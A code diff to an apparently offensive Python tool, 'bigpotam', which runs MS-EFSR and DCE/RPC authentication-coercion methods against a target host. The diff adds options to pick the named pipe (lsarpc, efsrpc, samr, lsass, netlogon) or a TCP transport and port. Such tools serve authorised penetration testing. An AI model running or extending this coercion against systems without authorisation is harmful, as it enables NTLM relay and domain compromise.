@@ -86,7 +86,30 @@ def parse_args():
         "-all-pipes",
         action="store_true",
         dest="all_pipes",
-        help="Try all EFSR named pipes per method (not just lsarpc)",
+        help="Try all EFSR transports per method (includes tcp_* when -tcp-port is set)",
+    )
+    coercion.add_argument(
+        "-pipe",
+        "-efsr-pipe",
+        dest="efsr_pipe",
+        choices=[
+            "lsarpc",
+            "efsrpc",
+            "samr",
+            "lsass",
+            "netlogon",
+            "tcp_lsarpc",
+            "tcp_efsr",
+        ],
+        default=None,
+        help="MS-EFSR pipe/transport override",
+    )
+    coercion.add_argument(
+        "-tcp-port",
+        type=int,
+        default=None,
+        dest="tcp_port",
+        help="RPC TCP port for EFSR tcp_* transports",
     )
 
     auth = parser.add_argument_group("authentication")
@@ -206,8 +229,12 @@ def _try_rpc(method, args, address, target_ip, auth_kw, failed_pipes):
     """Handle standard DCE/RPC coercion methods. Returns True on success."""
     log = logging.getLogger("bigpotam")
 
-    if args.all_pipes and method["protocol"] == "MS-EFSR":
-        pipes = method["all_pipes"]
+    if method["protocol"] == "MS-EFSR" and args.efsr_pipe:
+        pipes = [args.efsr_pipe]
+    elif args.all_pipes and method["protocol"] == "MS-EFSR":
+        pipes = list(method["all_pipes"])
+        if args.tcp_port:
+            pipes.extend(method.get("tcp_pipes", []))
     elif "default_pipes" in method:
         pipes = method["default_pipes"]
     else:
@@ -242,6 +269,7 @@ def _try_rpc(method, args, address, target_ip, auth_kw, failed_pipes):
             uuid,
             target_ip=target_ip,
             port=args.port,
+            tcp_port=args.tcp_port,
             use_epm=use_epm,
             **auth_kw,
         )
@@ -271,6 +299,13 @@ def _try_rpc(method, args, address, target_ip, auth_kw, failed_pipes):
 def run(args):
     """Execute coercion methods against the target."""
     log = logging.getLogger("bigpotam")
+
+    if args.efsr_pipe and not args.efsr_pipe.startswith("tcp_") and args.tcp_port:
+        log.debug("Ignoring -tcp-port because %s is not a tcp_* transport", args.efsr_pipe)
+
+    if args.efsr_pipe and args.efsr_pipe.startswith("tcp_") and not args.tcp_port:
+        log.error("MS-EFSR tcp_* transports require -tcp-port")
+        return 1
 
     domain, username, password, address = parse_target(args.target)
     domain = domain or ""
